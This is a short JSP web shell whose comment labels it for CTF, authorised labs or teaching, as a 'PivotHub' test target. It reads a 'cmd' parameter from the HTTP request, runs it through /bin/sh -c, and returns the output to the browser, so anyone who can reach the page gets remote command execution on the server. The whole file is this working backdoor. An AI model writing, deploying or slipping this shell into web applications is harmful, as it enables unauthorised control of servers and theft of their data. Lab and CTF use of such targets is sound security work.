<%@ page import="java.util.*,java.io.*" %>
<%-- ⚠ 仅用于 CTF / 授权靶场 / 教学（PivotHub 联调靶标） --%>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) out.println(line);
    }
%>
